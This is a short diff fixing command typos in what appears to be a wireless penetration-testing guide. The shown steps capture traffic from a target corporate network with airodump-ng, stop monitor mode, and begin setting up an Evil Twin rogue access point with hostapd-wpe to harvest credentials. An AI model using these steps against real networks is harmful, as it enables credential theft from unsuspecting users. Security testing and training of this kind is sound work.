@@ -183,10 +183,10 @@ b. Get the details of the station connected to the AP same as ESSID, BSSID, Chan
 root@kali:~# airodump-ng <interface_name> --essid <ESSID> --channel <CHANNEL_NO >-w <FILENAME>
 
 e.g:
-root@kali:~# airodump-ng wlan0mon --essid wifi-corp--channel 44 -w mgt
+root@kali:~# airodump-ng wlan0mon --essid wifi-corp --channel 44 -w mgt
 ​
 # 2. Stop the monitor mode of the network interface
-root@kali:~# airmon-stop wlan0mon
+root@kali:~# airmon-ng stop wlan0mon
 
 # 3. Create a rogue AP using hostapd-wpe and capture the credentials.
 a. Edit the Evil Twin AP config file accordingly
